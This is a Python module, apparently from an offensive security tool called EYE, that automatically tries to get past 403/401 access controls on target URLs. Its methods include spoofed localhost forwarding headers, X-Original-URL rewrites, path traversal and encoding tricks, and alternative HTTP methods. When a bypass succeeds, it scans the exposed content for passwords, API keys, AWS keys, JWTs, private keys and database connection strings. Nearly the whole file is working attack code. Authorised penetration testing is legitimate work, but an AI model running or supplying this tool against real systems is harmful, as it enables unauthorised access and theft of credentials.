"""
EYE - 403/401 Bypass Module
Advanced access control evasion techniques
"""

import aiohttp
import asyncio
import re
from typing import Dict, List, Optional
from urllib.parse import urlparse, urlunparse
from rich.console import Console
from bs4 import BeautifulSoup

console = Console()


async def analyze_non_html_file(content: str, file_extension: str) -> Dict:
    """
    Analyze non-HTML files like .htaccess, .env, .config, etc.
    
    Args:
        content: Raw file content
        file_extension: File extension (without dot)
        
    Returns:
        Dictionary with file-specific analysis
    """
    analysis = {
        'file_type': file_extension or 'unknown',
        'line_count': len(content.split('\n')),
        'directives': [],
        'configurations': [],
        'comments': [],
        'preview_lines': []
    }
    
    lines = content.split('\n')
    
    # Get first 20 non-empty lines for preview
    preview_lines = []
    for line in lines[:50]:
        stripped = line.strip()
        if stripped and not stripped.startswith('#'):
            preview_lines.append(line[:100])  # Truncate long lines
            if len(preview_lines) >= 20:
                break
    analysis['preview_lines'] = preview_lines
    
    # Analyze .htaccess files
    if file_extension == 'htaccess' or '.htaccess' in file_extension:
        for line in lines:
            stripped = line.strip()
            if stripped and not stripped.startswith('#'):
                # Apache directives
                if any(directive in stripped for directive in 
                      ['RewriteRule', 'RewriteCond', 'Redirect', 'Allow', 'Deny', 'Order',
                       'DirectoryIndex', 'ErrorDocument', 'Options', 'SetEnv']):
                    analysis['directives'].append(stripped[:150])
    
    # Analyze config files (.env, .config, etc.)
    elif file_extension in ['env', 'config', 'conf', 'ini', 'properties']:
        for line in lines:
            stripped = line.strip()
            if '=' in stripped and not stripped.startswith('#'):
                analysis['configurations'].append(stripped[:150])
    
    # Extract comments
    for line in lines[:20]:
        stripped = line.strip()
        if stripped.startswith('#') or stripped.startswith('//'):
            analysis['comments'].append(stripped[:100])
    
    return analysis


async def extract_page_info(html_content: str, headers: dict, requested_url: str = '') -> Dict:
    """
    Extract useful information from bypassed page
    
    Args:
        html_content: HTML content of the page
        headers: Response headers
        requested_url: The originally requested URL to validate content match
        
    Returns:
        Dictionary with extracted information
    """
    info = {
        'title': None,
        'content_length': len(html_content),
        'content_type': headers.get('content-type', 'unknown'),
        'server': headers.get('server', 'unknown'),
        'sensitive_keywords': [],
        'emails': [],
        'interesting_patterns': [],
        'config_vars': [],
        'database_info': [],
        'secrets': [],
        'file_paths': [],
        'preview': None,
        'is_likely_false_positive': False,
        'false_positive_reason': None,
        'file_type_analysis': None
    }
    
    try:
        # Detect file type from URL
        file_extension = None
        if requested_url:
            parsed_url = urlparse(requested_url)
            path = parsed_url.path
            if '.' in path:
                file_extension = path.split('.')[-1].lower()
        
        # Check for false positive - HTML response for non-HTML file request
        is_html_content = bool(re.search(r'<!DOCTYPE|<html|<head|<body', html_content[:1000], re.IGNORECASE))
        content_type_lower = info['content_type'].lower()
        is_html_content_type = 'html' in content_type_lower
        
        # Non-HTML file requested but HTML returned = likely false positive
        if file_extension and file_extension not in ['html', 'htm', 'php', 'asp', 'aspx', 'jsp']:
            if is_html_content or (is_html_content_type and len(html_content) > 10000):
                info['is_likely_false_positive'] = True
                info['false_positive_reason'] = f"Requested .{file_extension} file but received HTML content (likely homepage/error page)"
        
        # Parse based on content type
        if not is_html_content:
            # Non-HTML content - show raw file analysis
            info['file_type_analysis'] = await analyze_non_html_file(html_content, file_extension)
        
        # Parse HTML
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Extract title
        if soup.title:
            info['title'] = soup.title.string.strip() if soup.title.string else None
        
        # Check for sensitive keywords
        sensitive_keywords = [
            'password', 'secret', 'api_key', 'token', 'credential', 
            'database', 'mysql', 'postgres', 'mongodb', 'redis',
            'aws_access', 'private_key', 'auth', 'admin', 'root',
            'jwt', 'session', 'cookie', 'bearer'
        ]
        
        text_lower = html_content.lower()
        found_keywords = [kw for kw in sensitive_keywords if kw in text_lower]
        info['sensitive_keywords'] = found_keywords
        
        # Extract emails
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        emails = re.findall(email_pattern, html_content)
        info['emails'] = list(set(emails))[:5]  # Limit to 5
        
        # Extract configuration variables (common formats)
        config_patterns = [
            r'(?i)(DB_HOST|DATABASE_HOST|DB_NAME|DATABASE_NAME|DB_USER|DB_PASSWORD)["\s:=]+["\']?([^"\'\s\n]+)["\']?',
            r'(?i)(MAIL_HOST|MAIL_PORT|MAIL_USERNAME|MAIL_PASSWORD)["\s:=]+["\']?([^"\'\s\n]+)["\']?',
            r'(?i)(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_REGION)["\s:=]+["\']?([^"\'\s\n]+)["\']?',
            r'(?i)(REDIS_HOST|REDIS_PORT|REDIS_PASSWORD)["\s:=]+["\']?([^"\'\s\n]+)["\']?',
            r'(?i)(APP_KEY|APP_SECRET|SECRET_KEY)["\s:=]+["\']?([^"\'\s\n]+)["\']?',
        ]
        
        for pattern in config_patterns:
            matches = re.findall(pattern, html_content)
            for match in matches:
                if len(match) >= 2:
                    info['config_vars'].append(f"{match[0]}={match[1][:50]}")  # Limit value length
        
        info['config_vars'] = list(set(info['config_vars']))[:10]  # Limit to 10 unique
        
        # Extract database connection strings
        db_patterns = [
            r'(mysql|postgresql|mongodb|redis)://[^\s<>"\']+',
            r'(?i)(host|server)["\s:=]+["\']?([a-zA-Z0-9.-]+)["\']?.*?(database|db)["\s:=]+["\']?([a-zA-Z0-9_-]+)["\']?',
        ]
        
        for pattern in db_patterns:
            matches = re.findall(pattern, html_content)
            for match in matches:
                if isinstance(match, tuple):
                    info['database_info'].append(' '.join(str(m) for m in match if m))
                else:
                    info['database_info'].append(match)
        
        info['database_info'] = list(set(info['database_info']))[:5]
        
        # Look for interesting patterns
        patterns = {
            'API Keys': r'(?i)(api[_-]?key|apikey)["\s:=]+["\']?([a-zA-Z0-9_-]{20,})["\']?',
            'JWT Tokens': r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}',
            'Tokens': r'(?i)(token|access[_-]?token)["\s:=]+["\']?([a-zA-Z0-9_-]{20,})["\']?',
            'AWS Keys': r'AKIA[0-9A-Z]{16}',
            'Private Keys': r'-----BEGIN (?:RSA |)PRIVATE KEY-----',
            'Generic Secrets': r'(?i)(secret|password)["\s:=]+["\']([^"\']{8,})["\']',
        }
        
        for pattern_name, pattern in patterns.items():
            matches = re.findall(pattern, html_content)
            if matches:
                info['interesting_patterns'].append(pattern_name)
                # Extract actual values (masked)
                for match in matches[:3]:  # Limit to 3 per type
                    if isinstance(match, tuple) and len(match) >= 2:
                        value = match[1] if len(match[1]) > 5 else match[0]
                        masked = value[:10] + '***' if len(value) > 10 else '***'
                        info['secrets'].append(f"{pattern_name}: {masked}")
                    elif isinstance(match, str) and len(match) > 10:
                        masked = match[:15] + '***'
                        info['secrets'].append(f"{pattern_name}: {masked}")
        
        info['secrets'] = list(set(info['secrets']))[:10]
        
        # Extract file paths
        path_patterns = [
            r'(/var/www/[^\s<>"\']+)',
            r'(/home/[^\s<>"\']+)',
            r'(/usr/[^\s<>"\']+)',
            r'(/etc/[^\s<>"\']+)',
            r'(C:\\[^\s<>"\']+)',
            r'([A-Z]:\\[^\s<>"\']+)',
        ]
        
        for pattern in path_patterns:
            paths = re.findall(pattern, html_content)
            info['file_paths'].extend(paths)
        
        info['file_paths'] = list(set(info['file_paths']))[:10]
        
        # Get content preview (first 500 chars of visible text)
        if soup.body:
            text = soup.body.get_text(separator=' ', strip=True)
            info['preview'] = text[:500] + '...' if len(text) > 500 else text
        else:
            # Fallback to raw content preview
            clean_text = re.sub(r'<[^>]+>', ' ', html_content)
            clean_text = re.sub(r'\s+', ' ', clean_text).strip()
            info['preview'] = clean_text[:500] + '...' if len(clean_text) > 500 else clean_text
        
    except Exception as e:
        info['parse_error'] = str(e)
    
    return info


async def attempt_bypass(url: str, original_status: int) -> Dict:
    """
    Attempt to bypass 403/401 access controls using various techniques
    
    Args:
        url: Target URL that returned 403/401
        original_status: The original HTTP status code (403 or 401)
        
    Returns:
        Dictionary with bypass results
    """
    result = {
        'url': url,
        'original_status': original_status,
        'bypassed': False,
        'technique': None,
        'final_status': None,
        'bypass_url': None,
        'page_info': None
    }
    
    # Only attempt bypass for 401 or 403 status codes
    if original_status not in [401, 403]:
        return result
    
    # Parse URL
    parsed = urlparse(url)
    base_path = parsed.path.rstrip('/')
    
    # Enhanced bypass techniques (30+ methods)
    techniques = {
        # HTTP Headers - IP Spoofing
        'X-Originating-IP: 127.0.0.1': {
            'headers': {'X-Originating-IP': '127.0.0.1'},
            'path': base_path
        },
        'X-Forwarded-For: 127.0.0.1': {
            'headers': {'X-Forwarded-For': '127.0.0.1'},
            'path': base_path
        },
        'X-Forwarded: 127.0.0.1': {
            'headers': {'X-Forwarded': '127.0.0.1'},
            'path': base_path
        },
        'Forwarded-For: 127.0.0.1': {
            'headers': {'Forwarded-For': '127.0.0.1'},
            'path': base_path
        },
        'X-Remote-IP: 127.0.0.1': {
            'headers': {'X-Remote-IP': '127.0.0.1'},
            'path': base_path
        },
        'X-Remote-Addr: 127.0.0.1': {
            'headers': {'X-Remote-Addr': '127.0.0.1'},
            'path': base_path
        },
        'X-ProxyUser-Ip: 127.0.0.1': {
            'headers': {'X-ProxyUser-Ip': '127.0.0.1'},
            'path': base_path
        },
        'X-Original-URL: ' + base_path: {
            'headers': {'X-Original-URL': base_path},
            'path': base_path
        },
        'X-Rewrite-URL: ' + base_path: {
            'headers': {'X-Rewrite-URL': base_path},
            'path': base_path
        },
        'X-Custom-IP-Authorization: 127.0.0.1': {
            'headers': {'X-Custom-IP-Authorization': '127.0.0.1'},
            'path': base_path
        },
        'X-Forwarded-Host: localhost': {
            'headers': {'X-Forwarded-Host': 'localhost'},
            'path': base_path
        },
        'X-Host: localhost': {
            'headers': {'X-Host': 'localhost'},
            'path': base_path
        },
        
        # HTTP Headers - Override Methods
        'X-HTTP-Method-Override: GET': {
            'headers': {'X-HTTP-Method-Override': 'GET'},
            'path': base_path
        },
        'X-Original-HTTP-Method: GET': {
            'headers': {'X-Original-HTTP-Method': 'GET'},
            'path': base_path
        },
        
        # Referer Bypass
        'Referer: ' + url: {
            'headers': {'Referer': url},
            'path': base_path
        },
        'Referer: ' + parsed.scheme + '://' + parsed.netloc: {
            'headers': {'Referer': parsed.scheme + '://' + parsed.netloc},
            'path': base_path
        },
        
        # Path Manipulation - Traversal
        'Path: /%2e' + base_path: {
            'headers': {},
            'path': '/%2e' + base_path
        },
        'Path: /' + base_path.lstrip('/'): {
            'headers': {},
            'path': '/' + base_path.lstrip('/')
        },
        'Path: ' + base_path + '/.': {
            'headers': {},
            'path': base_path + '/.'
        },
        'Path: ' + base_path + '/..': {
            'headers': {},
            'path': base_path + '/..'
        },
        'Path: ' + base_path + '/./': {
            'headers': {},
            'path': base_path + '/./'
        },
        'Path: ' + base_path + '//': {
            'headers': {},
            'path': base_path + '//'
        },
        'Path: ' + base_path + '/.;/': {
            'headers': {},
            'path': base_path + '/.;/'
        },
        'Path: ' + base_path + ';': {
            'headers': {},
            'path': base_path + ';'
        },
        'Path: ' + base_path + '..;/': {
            'headers': {},
            'path': base_path + '..;/'
        },
        
        # URL Encoding
        'Path: ' + base_path + '%20': {
            'headers': {},
            'path': base_path + '%20'
        },
        'Path: ' + base_path + '%09': {
            'headers': {},
            'path': base_path + '%09'
        },
        'Path: ' + base_path + '%00': {
            'headers': {},
            'path': base_path + '%00'
        },
        'Path: ' + base_path + '%0a': {
            'headers': {},
            'path': base_path + '%0a'
        },
        'Path: ' + base_path + '%0d': {
            'headers': {},
            'path': base_path + '%0d'
        },
        'Path: ' + base_path + '%2f': {
            'headers': {},
            'path': base_path + '%2f'
        },
        
        # Case Variation
        'Path: ' + base_path.upper(): {
            'headers': {},
            'path': base_path.upper()
        },
        
        # Trailing Slash
        'Path: ' + base_path + '/': {
            'headers': {},
            'path': base_path + '/'
        },
        
        # Combined techniques
        'X-Forwarded-For + X-Original-URL': {
            'headers': {
                'X-Forwarded-For': '127.0.0.1',
                'X-Original-URL': base_path
            },
            'path': base_path
        }
    }
    
    timeout = aiohttp.ClientTimeout(total=10)
    
    # HTTP methods to try
    http_methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'TRACE']
    
    try:
        async with aiohttp.ClientSession(timeout=timeout) as session:
            # First try all techniques with GET
            for technique_name, technique_data in techniques.items():
                # Construct bypass URL
                bypass_url = urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    technique_data['path'],
                    parsed.params,
                    parsed.query,
                    parsed.fragment
                ))
                
                try:
                    async with session.get(
                        bypass_url,
                        headers=technique_data['headers'],
                        ssl=False,
                        allow_redirects=False
                    ) as response:
                        # Success! Bypassed the restriction (200 or 3xx redirect)
                        if response.status == 200 or (300 <= response.status < 400):
                            result['bypassed'] = True
                            result['technique'] = technique_name
                            result['final_status'] = response.status
                            result['bypass_url'] = bypass_url
                            
                            # Extract page information for 200 responses
                            if response.status == 200:
                                try:
                                    content = await response.text()
                                    result['page_info'] = await extract_page_info(content, dict(response.headers), url)
                                except Exception:
                                    result['page_info'] = {'error': 'Could not extract page info'}
                            
                            console.print(f"[bold green]🔓 BYPASS SUCCESS![/bold green]")
                            console.print(f"    URL: [cyan]{url}[/cyan]")
                            console.print(f"    Technique: [yellow]{technique_name}[/yellow]")
                            console.print(f"    Status: [red]{original_status}[/red] → [green]{response.status}[/green]")
                            
                            return result
                
                except Exception:
                    continue
                
                # Small delay to avoid rate limiting
                await asyncio.sleep(0.05)
            
            # If GET didn't work, try different HTTP methods on original URL
            console.print(f"[*] Trying alternative HTTP methods for: [cyan]{url}[/cyan]")
            for method in http_methods[1:]:  # Skip GET as we already tried it
                try:
                    async with session.request(
                        method,
                        url,
                        ssl=False,
                        allow_redirects=False
                    ) as response:
                        if response.status == 200 or (300 <= response.status < 400):
                            result['bypassed'] = True
                            result['technique'] = f'HTTP Method: {method}'
                            result['final_status'] = response.status
                            result['bypass_url'] = url
                            
                            # Extract page information for 200 responses
                            if response.status == 200:
                                try:
                                    content = await response.text()
                                    result['page_info'] = await extract_page_info(content, dict(response.headers), url)
                                except Exception:
                                    result['page_info'] = {'error': 'Could not extract page info'}
                            
                            console.print(f"[bold green]🔓 BYPASS SUCCESS![/bold green]")
                            console.print(f"    URL: [cyan]{url}[/cyan]")
                            console.print(f"    Method: [yellow]{method}[/yellow]")
                            console.print(f"    Status: [red]{original_status}[/red] → [green]{response.status}[/green]")
                            
                            return result
                
                except Exception:
                    continue
                
                await asyncio.sleep(0.05)
    
    except Exception:
        pass
    
    return result


async def attempt_bypass_multiple(urls_with_status: List[Dict]) -> Dict[str, Dict]:
    """
    Attempt to bypass multiple URLs with 403/401 status codes
    
    Args:
        urls_with_status: List of dicts with 'url' and 'status' keys
        
    Returns:
        Dictionary mapping URLs to their bypass results
    """
    # Filter only 401/403 responses
    bypass_targets = [
        item for item in urls_with_status 
        if item.get('status') in [401, 403]
    ]
    
    if not bypass_targets:
        return {}
    
    console.print(f"\n[*] Attempting to bypass [yellow]{len(bypass_targets)}[/yellow] restricted URLs...")
    
    # Create semaphore to limit concurrent requests
    semaphore = asyncio.Semaphore(10)
    
    async def bypass_with_limit(item):
        async with semaphore:
            return await attempt_bypass(item['url'], item['status'])
    
    # Execute all bypass attempts concurrently
    tasks = [bypass_with_limit(item) for item in bypass_targets]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Organize results
    bypass_data = {}
    successful_bypasses = 0
    
    for result in results:
        if isinstance(result, dict) and not isinstance(result, Exception):
            url = result['url']
            bypass_data[url] = result
            if result['bypassed']:
                successful_bypasses += 1
    
    # Print summary
    if successful_bypasses > 0:
        console.print(f"[✓] [bold green]{successful_bypasses} bypass(es) successful![/bold green] 🔓")
    else:
        console.print(f"[!] No successful bypasses found")
    
    return bypass_data
